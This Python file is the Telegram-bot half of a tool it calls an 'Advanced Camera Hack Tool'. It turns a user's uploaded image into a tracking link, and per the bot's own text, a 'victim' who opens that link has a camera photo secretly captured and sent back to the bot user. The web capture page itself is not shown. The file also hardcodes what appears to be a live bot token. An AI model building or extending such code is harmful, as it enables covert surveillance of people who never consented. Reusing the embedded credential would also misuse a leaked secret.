import os
import uuid
import asyncio
import json
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9238640840:AAG-WFz-oHToWP6pRm-nuO5nQBpIUB5AInQ")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

IMG_DIR = "captured_images"
MAP_FILE = "token_map.json"

os.makedirs(IMG_DIR, exist_ok=True)

def load_map():
    if os.path.exists(MAP_FILE):
        try:
            return json.load(open(MAP_FILE))
        except Exception:
            return {}
    return {}

def save_map(m):
    json.dump(m, open(MAP_FILE, "w"))

# Yahan humne start command ko update kiya hai
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Tera banner image URL
    banner_url = "https://kommodo.ai/i/cKT2XT3skPZ0pT2WUTsa"
    
    # Attractive welcome message
    welcome_text = (
        "🔥 *TRIDEVCYBER WARRIOR* 🔥\n"
        "⚡ _Advanced Camera Hack Tool_ ⚡\n\n"
        "👋 *Welcome Bhai!*\n\n"
        "📸 Mujhe koi bhi image bhej. Main tujhe ek link dunga.\n"
        "🔗 Jab koi victim us link ko kholenga, teri image dikhegi aur camera se photo capture hoke wapas yahan aayegi.\n\n"
        "👨‍💻 *Developed by TRIDEV CYBER WARRIOR*"
    )
    
    # Image ke saath message bhej rahe hain (parse_mode="Markdown" se bold/italic lagega)
    await update.message.reply_photo(
        photo=banner_url,
        caption=welcome_text,
        parse_mode="Markdown"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    photo = update.message.photo[-1]
    file_id = photo.file_id

    token = uuid.uuid4().hex[:12]
    img_path = os.path.join(IMG_DIR, f"{token}.jpg")

    # Telegram API se direct download (no timeouts)
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}", timeout=15)
        res = r.json()
        if not res.get("ok"):
            await update.message.reply_text("❌ Telegram API error. Try again.")
            return
        
        file_path = res["result"]["file_path"]
        img_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        img_data = requests.get(img_url, timeout=20).content
        
        with open(img_path, "wb") as f:
            f.write(img_data)
            
    except Exception as e:
        print("Download error:", e)
        await update.message.reply_text("❌ Image download nahi ho payi. Dobara bhej please.")
        return

    m = load_map()
    m[token] = chat_id
    save_map(m)

    link = f"{BASE_URL}/?t={token}"
    await update.message.reply_text(
        f"✅ *Link Ready!*\n\n"
        f"🔗 `{link}`\n\n"
        f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi.",
        parse_mode="Markdown"
    )

async def main_bot():
    tg_app = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .connect_timeout(30)
        .write_timeout(30)
        .build()
    )
    tg_app.add_handler(CommandHandler("start", start))
    tg_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    print("Bot starting (polling)...")
    await tg_app.initialize()
    await tg_app.start()
    await tg_app.updater.start_polling()
    while True:
        await asyncio.sleep(3600)

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_bot())

if __name__ == "__main__":
    run_bot()
